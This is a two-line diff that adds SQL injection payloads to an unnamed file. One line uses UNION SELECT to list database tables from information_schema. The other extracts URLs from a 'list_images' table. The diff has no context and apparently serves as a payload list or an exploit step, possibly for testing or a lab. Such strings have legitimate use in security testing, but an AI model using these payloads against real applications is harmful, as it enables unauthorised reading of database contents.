@@ -1,0 +1,2 @@
+5 UNION SELECT table_name, NULL FROM information_schema.tables -- 
+5 UNION SELECT url, NULL FROM list_images -- 
